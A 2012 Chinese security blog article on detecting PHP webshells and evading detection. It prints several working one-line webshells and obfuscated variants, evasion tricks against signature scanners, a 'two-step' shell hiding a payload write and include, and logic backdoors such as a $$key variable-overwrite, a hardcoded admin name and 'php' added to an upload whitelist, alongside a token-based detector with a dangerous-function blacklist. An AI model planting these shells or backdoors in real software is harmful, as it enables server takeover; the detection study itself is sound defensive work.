<!DOCTYPE html>
<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>常见 Webshell 的检测方法及检测绕过思路 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
  

<meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta name="MobileOptimized" content="width"/>
<meta name="HandheldFriendly" content="true"/>


<meta name="applicable-device" content="pc,mobile">

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="mobile-web-app-capable" content="yes">

<meta name="author" content="作者不明" /><meta name="description" content="常见 Webshell 的检测方法及检测绕过思路。我们从一个最简单的webshell结构可以看出其基本结构：“&lt;?php eval($_POST[‘a’]);?&gt;”。从目前被公布的一句话webshell来看，基本都符合这个结构，即shell的实现需要两步：数据的传递、执行所传递的数据。对于数据传递，我们通常的做法是使用$_GET、$_POST、$_SERVER、$_COOKIE等获取客户端数据。但这类关键词如果直接出现的话，那么可以很容易回溯到，我们有几种方案来解决这个问题：对于数据执行，我们通常使用的函数或方式有：eval、create_function、``、exec、preg_replace等。当然这类关键词如果直接出现的话，我们的自动化webshell检测脚本可以很轻易的进行识别，目前看我们可以绕过检测的方案较少：" />
<meta name="keywords" content="常见 Webshell 的检测方法及检测绕过思路" />



<meta name="baidu-site-verification" content="GSIJv096Bu" />



<meta name="generator" content="Hugo 0.82.0" />


<link rel="canonical" href="https://lcx.cc/post/3188/" />





<link rel="icon" href="/favicon.ico" />











<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">





<meta property="og:title" content="常见 Webshell 的检测方法及检测绕过思路" />
<meta property="og:description" content="常见 Webshell 的检测方法及检测绕过思路。我们从一个最简单的webshell结构可以看出其基本结构：“&lt;?php eval($_POST[‘a’]);?&gt;”。从目前被公布的一句话webshell来看，基本都符合这个结构，即shell的实现需要两步：数据的传递、执行所传递的数据。对于数据传递，我们通常的做法是使用$_GET、$_POST、$_SERVER、$_COOKIE等获取客户端数据。但这类关键词如果直接出现的话，那么可以很容易回溯到，我们有几种方案来解决这个问题：对于数据执行，我们通常使用的函数或方式有：eval、create_function、``、exec、preg_replace等。当然这类关键词如果直接出现的话，我们的自动化webshell检测脚本可以很轻易的进行识别，目前看我们可以绕过检测的方案较少：" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://lcx.cc/post/3188/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2012-12-18T19:06:52&#43;08:00" />
<meta property="article:modified_time" content="2012-12-18T19:14:00&#43;08:00" />

<meta itemprop="name" content="常见 Webshell 的检测方法及检测绕过思路">
<meta itemprop="description" content="常见 Webshell 的检测方法及检测绕过思路。我们从一个最简单的webshell结构可以看出其基本结构：“&lt;?php eval($_POST[‘a’]);?&gt;”。从目前被公布的一句话webshell来看，基本都符合这个结构，即shell的实现需要两步：数据的传递、执行所传递的数据。对于数据传递，我们通常的做法是使用$_GET、$_POST、$_SERVER、$_COOKIE等获取客户端数据。但这类关键词如果直接出现的话，那么可以很容易回溯到，我们有几种方案来解决这个问题：对于数据执行，我们通常使用的函数或方式有：eval、create_function、``、exec、preg_replace等。当然这类关键词如果直接出现的话，我们的自动化webshell检测脚本可以很轻易的进行识别，目前看我们可以绕过检测的方案较少："><meta itemprop="datePublished" content="2012-12-18T19:06:52&#43;08:00" />
<meta itemprop="dateModified" content="2012-12-18T19:14:00&#43;08:00" />
<meta itemprop="wordCount" content="4682">
<meta itemprop="keywords" content="Shell,Web,WebShell,检测,绕过,思路,app,Blog,Html,HTTP,IE,IP,IPS,Net,PHP,POS,SQL,代码,函数,后门,技术,脚本,扫描,数据,文件,问题,一句话," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="常见 Webshell 的检测方法及检测绕过思路"/>
<meta name="twitter:description" content="常见 Webshell 的检测方法及检测绕过思路。我们从一个最简单的webshell结构可以看出其基本结构：“&lt;?php eval($_POST[‘a’]);?&gt;”。从目前被公布的一句话webshell来看，基本都符合这个结构，即shell的实现需要两步：数据的传递、执行所传递的数据。对于数据传递，我们通常的做法是使用$_GET、$_POST、$_SERVER、$_COOKIE等获取客户端数据。但这类关键词如果直接出现的话，那么可以很容易回溯到，我们有几种方案来解决这个问题：对于数据执行，我们通常使用的函数或方式有：eval、create_function、``、exec、preg_replace等。当然这类关键词如果直接出现的话，我们的自动化webshell检测脚本可以很轻易的进行识别，目前看我们可以绕过检测的方案较少："/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->




</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">Nuclear'Atk</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
          
        
      </li>
    

    
  </ul>
</nav>


  
    






  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />




<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>

  

  

  

  <header id="header" class="header container">
    <div class="logo-wrapper">
  <a href="/" class="logo">
    
      Nuclear'Atk
    
  </a>
</div>

<nav class="site-navbar">
  <ul id="menu" class="menu">
    
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
          

        

      </li>
    

    
    

    
  </ul>
</nav>

  </header>

  <div id="mobile-panel">
    <main id="main" class="main bg-llight">
      <div class="content-wrapper">
        <div id="content" class="content container">
          <article class="post bg-white">
    
    <header class="post-header">
      <h1 class="post-title">常见 Webshell 的检测方法及检测绕过思路</h1>
      
      <div class="post-meta">
        <time datetime="2012-12-18" class="post-time">
          2012-12-18
        </time>
        <div class="post-category">
            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
            <a href="https://lcx.cc/categories/shell/"> Shell </a>
            <a href="https://lcx.cc/categories/web/"> Web </a>
            <a href="https://lcx.cc/categories/webshell/"> WebShell </a>
            <a href="https://lcx.cc/categories/%E6%A3%80%E6%B5%8B/"> 检测 </a>
            <a href="https://lcx.cc/categories/%E7%BB%95%E8%BF%87/"> 绕过 </a>
            <a href="https://lcx.cc/categories/%E6%80%9D%E8%B7%AF/"> 思路 </a>
            
          </div>
        <span class="more-meta"> 约 4682 字 </span>
          <span class="more-meta"> 预计阅读 10 分钟 </span>

        
        

        
        
      </div>
    </header>

    
    
<div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">文章目录</h2>
  <div class="post-toc-content">
    
  </div>
</div>

    
    <div class="post-content">
      
<p style="text-indent:2em;">
	之前发的一篇，转过来。
</p>
<p style="text-indent:2em;">
	<strong>Webshell的因素</strong> 
</p>
<p style="text-indent:2em;">
	我们从一个最简单的webshell结构可以看出其基本结构：“&lt;?php eval($_POST[‘a’]);?&gt;”
</p>
<p style="text-indent:2em;">
	<img title="常见 Webshell 的检测方法及检测绕过思路" alt="常见 Webshell 的检测方法及检测绕过思路" src="/file/old/1722_1.png" width="409" height="109" /> 
</p>
<p style="text-indent:2em;">
	从目前被公布的一句话webshell来看，基本都符合这个结构，即shell的实现需要两步：数据的传递、执行所传递的数据。
</p>
<p style="text-indent:2em;">
	<strong>数据传递&amp;绕过检测</strong> 
</p>
<p style="text-indent:2em;">
	对于数据传递，我们通常的做法是使用$_GET、$_POST、$_SERVER、$_COOKIE等获取客户端数据。但这类关键词如果直接出现的话，那么可以很容易回溯到，我们有几种方案来解决这个问题：
</p>
<ol>
	<li>
		利用应用本身所在框架的输入封装来得到传递的数据
	</li>
	<li>
		采取某种变通的方式来绕过检测，譬如使用${"_G"."ET"}。不过这种方式也有自身的缺点，可以跟踪“${”；不过这种跟踪又可以通过“$/*a*/{”这种方式绕过（当然其又有被跟踪的可能性）。
	</li>
	<li>
		使用其他数据获取方式来获取数据，譬如$_REQUEST、$GLOBALS[“_GET”]、$_FILE等。
	</li>
	<li>
		人为构造语言缺陷或应用漏洞，并且这种缺陷是不易察觉的，譬如伪造管理员session等。
	</li>
</ol>
<p style="text-indent:2em;">
	<strong>数据执行&amp;绕过检测</strong> 
</p>
<p style="text-indent:2em;">
	对于数据执行，我们通常使用的函数或方式有：eval、create_function、``、exec、preg_replace等。当然这类关键词如果直接出现的话，我们的自动化webshell检测脚本可以很轻易的进行识别，目前看我们可以绕过检测的方案较少：
</p>
<p style="text-indent:2em;">
	1、通过$a()这种方式来执行函数。不过这种方式也有自身规律在里面，有很多扫描器已经内置了“$.*($.*”这种规则，同样我们可以通过$a/*a*/()这种方式以及相应的变通方式来绕过。（当然其又有被跟踪的可能性）
</p>
<p style="text-indent:2em;">
	2、尝试去找到不在黑名单中的函数，或者极其常见的函数。
</p>
<p style="text-indent:2em;">
	关于一句话webshell的呈现形式和检测方案
</p>
<p style="text-indent:2em;">
	最近微博上提到的变种加密的webshell很多啊，有Fredrik提到的tiny php shell
</p>
<p style="text-indent:2em;">
	（<a href="http://h.ackack.net/tiny-php-shell.html" target="_blank">http://h.ackack.net/tiny-php-shell.html</a>）：
</p>
<p style="text-indent:2em;">
	&lt;?=($_=@$_GET[2]).@<strong>$_($_</strong>GET[1])?&gt;
</p>
<p style="text-indent:2em;">
	有Spanner的Non alphanumeric webshell
</p>
<p style="text-indent:2em;">
	（<a href="http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/" target="_blank">http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/</a>）：
</p>
<p style="text-indent:2em;">
	&lt;?
</p>
<p style="text-indent:2em;">
	$_="";
</p>
<p style="text-indent:2em;">
	$_[+""]='';
</p>
<p style="text-indent:2em;">
	$_="$_"."";
</p>
<p style="text-indent:2em;">
	$_=($_[+""]|"").($_[+""]|"").($_[+""]^"");
</p>
<p style="text-indent:2em;">
	?&gt;
</p>
<p style="text-indent:2em;">
	&lt;?=<strong>${'_'.$_}['_']($</strong>{'_'.$_}['__']);?&gt;
</p>
<p style="text-indent:2em;">
	还有从<a href="http://blog.sucuri.net/" target="_blank">http://blog.sucuri.net/</a>&nbsp;上看到的N个webshell
</p>
<p style="text-indent:2em;">
	（<a href="http://blog.sucuri.net/2011/09/ask-sucuri-what-about-the-backdoors.html" target="_blank">http://blog.sucuri.net/2011/09/ask-sucuri-what-about-the-backdoors.html</a>）：
</p>
<p style="text-indent:2em;">
	if (isset($_REQUEST['asc']))&nbsp;<strong>eval(</strong>stripslashes($_REQUEST['asc']));&nbsp;
</p>
<p style="text-indent:2em;">
	wp__theme_icon=<strong>create_function(</strong>”,file_get_contents(‘/path/wp-content/themes/themename/images/void.jpg’));$wp__theme_icon();&nbsp;
</p>
<p style="text-indent:2em;">
	&nbsp;
</p>
<p style="text-indent:2em;">
	$auth_pass = “63a9f0ea7bb98050796b649e85481845″;
</p>
<p style="text-indent:2em;">
	$color = “#df5″;
</p>
<p style="text-indent:2em;">
	$default_action = “SQL”;
</p>
<p style="text-indent:2em;">
	$default_charset = “Windows-1251″;
</p>
<p style="text-indent:2em;">
	$protectionoffer = “ficken”;
</p>
<p style="text-indent:2em;">
	<strong>preg_replace(</strong>“/.*/e”,"\x65\x76\x61\x6C...");&nbsp;
</p>
<p style="text-indent:2em;">
	&nbsp;
</p>
<p style="text-indent:2em;">
	&lt;?php $XKsyG=’as’;$RqoaUO=’e’;$ygDOEJ=$XZKsyG.’s’.$RqoaUO.’r’.’t’;$joEDdb
</p>
<p style="text-indent:2em;">
	=’b’.$XZKsyG.$RqoaUO.(64).’_’.’d’.$RqoaUO.’c’.’o’.’d’.$RqoaUO;<strong>@$ygDOEJ(@$j</strong> 
</p>
<p style="text-indent:2em;">
	<strong>oEDdb(</strong>‘ZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lvYVhOelpY…
</p>
<p style="text-indent:2em;">
	&nbsp;
</p>
<p style="text-indent:2em;">
	还有某人发现的：
</p>
<p style="text-indent:2em;">
	$k = "{${<strong>phpinfo(</strong>)}}";
</p>
<p style="text-indent:2em;">
	&nbsp;
</p>
<p style="text-indent:2em;">
	更多的可以看这里：<a href="http://www.php-security.org/2010/05/20/mops-submission-07-our-dynamic-php/index.html" target="_blank">http://www.php-security.org/2010/05/20/mops-submission-07-our-dynamic-php/index.html</a> 
</p>
<p style="text-indent:2em;">
	&nbsp;
</p>
<p style="text-indent:2em;">
	从上述的这些shell中我们已经能找到规律，虽然我们没有非常完善的办法定位数据传递这个步骤，但是我们能比较方便地找到数据执行的位置：“(”。从我目前掌握的情况来看，一个数据执行（当然include这几个和“``”反引号执行另作考虑）的基本条件一定会包含这个小括号，如果哪位大牛有什么可以在代码中不使用小括号就可以达到代码执行的方法，请一定不吝赐教。
</p>
<p style="text-indent:2em;">
	所以我们可以很容易的做出我们的webshell检测方法：使用token_get_all将php代码打成token，然后找到每一个”(”，判断括号前面的数据是不是合法的即可。至于如何判断合法，我们遵循一个原则：如果是空格、注释之类，则采取忽略方式（即continue，继续往前判断）；如果是分支、条件判断或运算符，则我们认为是合法的；如果是字符串，并且在黑名单，我们认为是非法的，否则是合法的；如果不满足上述条件，我们先暂认为是非法的（通过此项不断完善我们的配置和算法）。
</p>
<p style="text-indent:2em;">
	基于上述理论，我们实现我们的算法如下（其中部分代码做省略处理，如需完整代码，请见后面链接）：
</p>
<p style="text-indent:2em;">
	&lt;?php
</p>
<p style="text-indent:2em;">
	final class Conf{
</p>
<p style="text-indent:2em;">
	public static $strict = false;
</p>
<p style="text-indent:2em;">
	//有可能有危害的函数
</p>
<p style="text-indent:2em;">
	public static $vul_func = array('create_function', 'eval', ... 'usort');
</p>
<p style="text-indent:2em;">
	public static $allow_chars = array('.','=',',','+','-','*','/','%','^','&amp;','|','!',);
</p>
<p style="text-indent:2em;">
	//无危害的token类型
</p>
<p style="text-indent:2em;">
	public static $allow_type = array(T_AND_EQUAL,T_BOOLEAN_AND,...T_SWITCH);
</p>
<p style="text-indent:2em;">
	//需要被忽略的token类型
</p>
<p style="text-indent:2em;">
	public static $ignore_type = array(T_WHITESPACE,T_COMMENT,T_DOC_COMMENT,);
</p>
<p style="text-indent:2em;">
	}
</p>
<p style="text-indent:2em;">
	function check_callable($code){
</p>
<p style="text-indent:2em;">
	$token = token_get_all($code);
</p>
<p style="text-indent:2em;">
	$vul = array();$flag = false;
</p>
<p style="text-indent:2em;">
	for($i=0;$i&lt;count($token);$i++){
</p>
<p style="text-indent:2em;">
	if(is_string($token[$i])){
</p>
<p style="text-indent:2em;">
	if($token[$i]=='('){
</p>
<p style="text-indent:2em;">
	$tmp = check_harmful($token,$i-1);//指向“(”之前
</p>
<p style="text-indent:2em;">
	if($tmp) $vul[] = $tmp;
</p>
<p style="text-indent:2em;">
	}
</p>
<p style="text-indent:2em;">
	if($token[$i]=='`'){
</p>
<p style="text-indent:2em;">
	$flag = $flag == true ? false : true;
</p>
<p style="text-indent:2em;">
	if($flag) $vul[] = $token[$i+1];
</p>
<p style="text-indent:2em;">
	}
</p>
<p style="text-indent:2em;">
	}
</p>
<p style="text-indent:2em;">
	}
</p>
<p style="text-indent:2em;">
	return $vul;
</p>
<p style="text-indent:2em;">
	}
</p>
<p style="text-indent:2em;">
	&nbsp;
</p>
<p style="text-indent:2em;">
	function check_harmful($token,$idx){
</p>
<p style="text-indent:2em;">
	for($i=$idx;$i&gt;0;$i--){
</p>
<p style="text-indent:2em;">
	if(is_array($token[$i])){
</p>
<p style="text-indent:2em;">
	if(in_array($token[$i][1],Conf::$vul_func)) {
</p>
<p style="text-indent:2em;">
	if(Conf::$strict){//严格检验
</p>
<p style="text-indent:2em;">
	if(has_varparam($token,$idx+1)) return $token[$i];//从“(”开始
</p>
<p style="text-indent:2em;">
	return false;
</p>
<p style="text-indent:2em;">
	}
</p>
<p style="text-indent:2em;">
	return $token[$i];
</p>
<p style="text-indent:2em;">
	}
</p>
<p style="text-indent:2em;">
	if(in_array($token[$i][0],Conf::$ignore_type)) continue;
</p>
<p style="text-indent:2em;">
	if(in_array($token[$i][0],Conf::$allow_type)) return false;
</p>
<p style="text-indent:2em;">
	return $token[$i];//$a();
</p>
<p style="text-indent:2em;">
	}else{
</p>
<p style="text-indent:2em;">
	if(in_array($token[$i],Conf::$allow_chars)) return false;
</p>
<p style="text-indent:2em;">
	}
</p>
<p style="text-indent:2em;">
	}
</p>
<p style="text-indent:2em;">
	return false;
</p>
<p style="text-indent:2em;">
	}
</p>
<p style="text-indent:2em;">
	&nbsp;
</p>
<p style="text-indent:2em;">
	function has_varparam($token,$idx){
</p>
<p style="text-indent:2em;">
	$bracket = 0;
</p>
<p style="text-indent:2em;">
	for($i=$idx;$i&lt;count($token);$i++){
</p>
<p style="text-indent:2em;">
	if(is_string($token[$i])){
</p>
<p style="text-indent:2em;">
	if($token[$i]=="(") $bracket ++;
</p>
<p style="text-indent:2em;">
	if($token[$i]==")") $bracket --;
</p>
<p style="text-indent:2em;">
	}else{
</p>
<p style="text-indent:2em;">
	if($token[$i][0]==T_VARIABLE) return true;
</p>
<p style="text-indent:2em;">
	}
</p>
<p style="text-indent:2em;">
	if($bracket===0) return false;
</p>
<p style="text-indent:2em;">
	}
</p>
<p style="text-indent:2em;">
	return false;
</p>
<p style="text-indent:2em;">
	}
</p>
<p style="text-indent:2em;">
	&nbsp;
</p>
<p style="text-indent:2em;">
	function _main(){
</p>
<p style="text-indent:2em;">
	$code = file_get_contents("shell.php");
</p>
<p style="text-indent:2em;">
	$vuls = check_callable($code);
</p>
<p style="text-indent:2em;">
	var_dump($vuls);
</p>
<p style="text-indent:2em;">
	}
</p>
<p style="text-indent:2em;">
	_main();
</p>
<p style="text-indent:2em;">
	?&gt;
</p>
<p style="text-indent:2em;">
	&nbsp;
</p>
<p style="text-indent:2em;">
	在不考虑误报率仅考虑覆盖率的情况下，上述代码对之前所描述的webshell的覆盖率几乎是100%。
</p>
<p style="text-indent:2em;">
	<img title="常见 Webshell 的检测方法及检测绕过思路" alt="常见 Webshell 的检测方法及检测绕过思路" src="/file/old/1723_2.jpg" width="692" height="421" /> 
</p>
<p style="text-indent:2em;">
	感兴趣的朋友可以尝试去写一些单文件的shell去突破下，如果突破成了，不妨指点一二，呵呵。
</p>
<p style="text-indent:2em;">
	<strong>关于“两句话”webshell的呈现形式</strong> 
</p>
<p style="text-indent:2em;">
	（<strong>当然所谓的“两句话”只是个概念描述方式（噱头</strong><strong>），不是技术。这种思路可能并非是独创的，因此此处仅作为思路总结，而并非新技术提出</strong>）
</p>
<p style="text-indent:2em;">
	那么在这些已有的webshell都可以被检测出的情况下（当然庞大的人肉问题定位工程暂且不谈），我们可以先假设我们可以通过技术手段检测并防御了“一句话”webshell（这里的一句话指的是上述的数据传递和数据执行在一起的webshell）；那么本文的重点便引申出来了 —— 如果我们将数据传递过程和数据执行过程分开，构造出我们的“两句话”webshell，是否可以突破上述的检测呢？
</p>
<p style="text-indent:2em;">
	当然我所指的分开可以绝不是字面上的意思把shell分两句话来写：
</p>
<p style="text-indent:2em;">
	$a = $_GET[‘a’];eval($a);
</p>
<p style="text-indent:2em;">
	这没有任何意义。而是说采取一些方式，隐藏数据传递者和数据执行者。这里简单举一个例子，譬如我们在a.php中插入了这样的代码，以便在必要时生成一个shell文件：
</p>
<p style="text-indent:2em;">
	file_put_contents(“/home/www/abc.txt”, str_rot13 (‘some code already encode’));
</p>
<p style="text-indent:2em;">
	&nbsp;
</p>
<p style="text-indent:2em;">
	然后我们在b.php中再实现一个数据执行者，最简单的莫过于：
</p>
<p style="text-indent:2em;">
	include “/home/www/abc.txt”;
</p>
<p style="text-indent:2em;">
	&nbsp;
</p>
<p style="text-indent:2em;">
	那么这种两步的webshell是很难被发现的。一般来说检查webshell的脚本不会对file_put_contents这种函数下手，但如果它真下手了，那么我们依然有很多方式可以进行此步：譬如上传一个文件，然后通过$_FILES['userfile']['tmp_name'] 获取文件位置；或者使用ftp_get获取一个文件；或者构造一个可以直接backupshell的注入点等等方式来完成我们这步。我们也可以使用curl、file、imagecreatefrompng、get_headers、bzopen、svn_checkout这样的函数来实现我们的数据提供。而这类的函数有十几个到几十个之多，<strong>只要可以进行网络信息的读取或者可以进行本地文件的读取或写入，那么我们就可以使之成为我们的数据提供者</strong>，而shell检测脚本绝不会把自己的触手伸这么远。而且通过sqlite、mysql或其它数据库隐藏我们的数据也不失为一个好方法。
</p>
<p style="text-indent:2em;">
	而对于数据执行者，即便将所有的include都grep出来，想把这个webshell的数据执行者找到也不是那么容易的事。尤其我们假设一种情况：这个include是原来正常的代码逻辑，而变化的仅仅是之前的数据传递者（即被include的页面）。另外有些框架有自动加载helper和model的功能，甚至有的有自动加载viewer的功能，这些也都是我们藏身的好地方。此外我们还可以使用virtual、php_check_syntax、array_filter、array_map、array_walk、call_user_func、preg_replace、usort等一般不在黑名单中的函数来绕过shell脚本检测，或者直接在应用代码中找上述的函数，看其所引用的变量是否可以稍加改变变成我们的数据提供者。
</p>
<p style="text-indent:2em;">
	所以我们看出“两句话”与一句话webshell的最大的区别在于不构造新的数据执行者或者可以完全隐匿数据执行者（利用已有的代码逻辑等），仅通过变换或构造数据提供者的前提下完成shell的功能。而$_GET、$_POST、$_SERVER、$_COOKIE、$_FILE、$_REQUEST、$GLOBALS[“_GET”]、$/*hello*/{"_G"."ET"}都是我们的数据传送者；file_get_contents、file、file_put_contents甚至print_r、unserialize都可以隐匿我们要传输的数据。当然扫描代码隐患的工具（譬如Rips）肯定能够扫描到这些隐患，但是这类工具毕竟不是用于扫描webshell的，且误报率是相当的高。
</p>
<p style="text-indent:2em;">
	<strong>逻辑后门</strong> 
</p>
<p style="text-indent:2em;">
	当然如上的利用方式中还是少不了特殊的函数的存在的。因此除此之外，我们可以尝试留下另一种后门：逻辑后门，譬如：
</p>
<p style="text-indent:2em;">
	&nbsp;
</p>
<p style="text-indent:2em;">
	&lt;?php
</p>
<p style="text-indent:2em;">
	<strong>foreach ($_GET as $key =&gt; $value) { //</strong><strong>由攻击者添加</strong> 
</p>
<p style="text-indent:2em;">
	<strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; $$key = $value;</strong> 
</p>
<p style="text-indent:2em;">
	<strong>}</strong> 
</p>
<p style="text-indent:2em;">
	// ... some code
</p>
<p style="text-indent:2em;">
	if (logged_in() || $authenticated) { //原有逻辑
</p>
<p style="text-indent:2em;">
	// ... administration area
</p>
<p style="text-indent:2em;">
	}
</p>
<p style="text-indent:2em;">
	?&gt;
</p>
<p style="text-indent:2em;">
	利用方式：<a href="http://www.example.com/index.php?authenticated=true" target="_blank">http://www.example.com/index.php?authenticated=true</a> 
</p>
<p style="text-indent:2em;">
	或者增加逻辑&nbsp;
</p>
<p style="text-indent:2em;">
	if($user_level==ADMIN&nbsp;<strong>|| $user_name==’monyer’</strong>){//admin area}
</p>
<p style="text-indent:2em;">
	或者增加配置&nbsp;
</p>
<p style="text-indent:2em;">
	$allow_upload = array(
</p>
<p style="text-indent:2em;">
	‘jpg’,’gif’,’png’,
</p>
<p style="text-indent:2em;">
	<strong>‘php’,</strong> 
</p>
<p style="text-indent:2em;">
	);
</p>
<p style="text-indent:2em;">
	那么可以想象检测难度之大，几乎是无法用扫描特征的方式解决的。对此可能我们只能采取其他方法，譬如线上文件监控以及线上与SVN代码的周期性diff等方式来解决了。
</p>
<p style="text-indent:2em;">
	OK，文章就到此，描述常见的一句话后门和变种方式以及检测方式，“两句话”后门的实现思路和逻辑后门的思路。希望各位看官看完会有收获，有问题及时联系，多谢！
</p>
<p style="text-indent:2em;">
	monyer.&nbsp;
</p>
<p style="text-indent:2em;">
	一句话php webshell的case和检测结果：
</p>
<p style="text-indent:2em;">
	Case：<a href="http://xeye.sinaapp.com/data/lab/php_shell/shell_sample.php" target="_blank">http://xeye.sinaapp.com/data/lab/php_shell/shell_sample.php</a> 
</p>
<p style="text-indent:2em;">
	Find Shell：<a href="http://xeye.sinaapp.com/data/lab/php_shell/find_shell.php" target="_blank">http://xeye.sinaapp.com/data/lab/php_shell/find_shell.php</a> 
</p>
<p style="text-indent:2em;">
	Find Shell Code：<a href="http://xeye.sinaapp.com/data/lab/php_shell/find_shell.php?show_code" target="_blank">http://xeye.sinaapp.com/data/lab/php_shell/find_shell.php?show_code</a> 
</p>
<p>
	<strong>参考资料：</strong> 
</p>
<p style="text-indent:2em;">
	<a href="http://h.ackack.net/tiny-php-shell.html" target="_blank">http://h.ackack.net/tiny-php-shell.html</a> 
</p>
<p style="text-indent:2em;">
	<a href="http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/" target="_blank">http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/</a> 
</p>
<p style="text-indent:2em;">
	<a href="http://blog.sucuri.net/2011/09/ask-sucuri-what-about-the-backdoors.html" target="_blank">http://blog.sucuri.net/2011/09/ask-sucuri-what-about-the-backdoors.html</a> 
</p>
<p style="text-indent:2em;">
	<a href="http://sourceforge.net/projects/rips-scanner/" target="_blank">http://sourceforge.net/projects/rips-scanner/</a> 
</p>
<p style="text-indent:2em;">
	<a href="http://www.php-security.org/2010/05/20/mops-submission-07-our-dynamic-php/index.html" target="_blank">http://www.php-security.org/2010/05/20/mops-submission-07-our-dynamic-php/index.html</a> 
</p>
    </div>

    
    
<div class="post-copyright">
  <p class="copyright-item">
    <span class="item-title">文章作者</span>
    <span class="item-content">作者不明</span>
  </p>
  <p class="copyright-item">
    <span class="item-title">上次更新</span>
    <span class="item-content">
      2012-12-18
      
    </span>
  </p>
  
  <p class="copyright-item">
    <span class="item-title">许可协议</span>
    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
  </p>
</div>


    
    

    <footer class="post-footer">
      <div class="post-tags">
          <a href="https://lcx.cc/tags/shell/">Shell</a>
          <a href="https://lcx.cc/tags/web/">Web</a>
          <a href="https://lcx.cc/tags/webshell/">WebShell</a>
          <a href="https://lcx.cc/tags/%E6%A3%80%E6%B5%8B/">检测</a>
          <a href="https://lcx.cc/tags/%E7%BB%95%E8%BF%87/">绕过</a>
          <a href="https://lcx.cc/tags/%E6%80%9D%E8%B7%AF/">思路</a>
          <a href="https://lcx.cc/tags/app/">app</a>
